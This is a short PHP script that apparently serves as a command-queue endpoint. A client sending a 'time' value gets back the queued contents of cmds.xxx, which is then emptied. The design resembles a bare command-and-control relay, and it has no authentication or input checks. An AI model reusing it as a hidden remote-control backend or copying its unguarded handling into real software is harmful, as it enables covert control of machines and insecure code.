<?php
 if(isset($_GET['time']) && $_GET['time']!=""){
$myfile = fopen("date.txt", "w") or die("Unable to open file!");
$txt = $_GET['time'];
fwrite($myfile, $txt);
fclose($myfile);
$file = file_get_contents('cmds.xxx');
echo $file;
$myfile = fopen("cmds.xxx", "w") or die("Unable to open file!");
$txt ="";
fwrite($myfile, $txt);
fclose($myfile);
}
else echo "Invalid Request";
?>